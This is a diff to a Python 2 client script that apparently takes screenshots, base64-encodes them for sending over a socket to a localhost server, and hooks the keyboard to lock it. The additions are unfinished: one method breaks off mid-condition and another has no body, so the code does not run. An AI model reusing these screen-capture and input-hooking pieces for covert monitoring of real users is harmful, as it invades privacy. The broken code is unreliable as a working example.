@@ -4,6 +4,8 @@ import pythoncom
 import pyHook
 from PIL import ImageGrab
 import time
+import StringIO
+import base64
 
 SERVER_IP = "127.0.0.1"
 PORT = 69
@@ -90,16 +92,27 @@ class ServerFunctions(object):
             data_from_server = self.client_socket.recv(DATA_RECEIVED_SIZE)
             print data_from_server
 
+    def understand_the_msg(self, string):
+        """
+        Receives: a string.
+        Return:
+        Description: The function understands what data the client will receive next,
+                     whether it's a string, an img or anything else.
+        """
+        if string ==
+
     @staticmethod
     def screen_shot():
         """
         Takes a screen shot and saves it as a StringIO.
         Return: The data of the image.
         """
-        import StringIO
         string_io = StringIO.StringIO()
         ImageGrab.grab().save(string_io, "JPEG")
-        return string_io.getvalue()
+        return base64.b64encode(string_io.getvalue(), 'utf-8')
+
+    def showing_screen_shots():
+
 
 
 def lock(event):
@@ -121,5 +134,8 @@ def keyboard_lock():
 
 
 if __name__ == "__main__":
-    client = Client()
-    client.start()
+    #client = Client()
+    #client.start()
+    string_io = StringIO.StringIO()
+    ImageGrab.grab().save(string_io, "JPEG")
+    print string_io.getvalue()
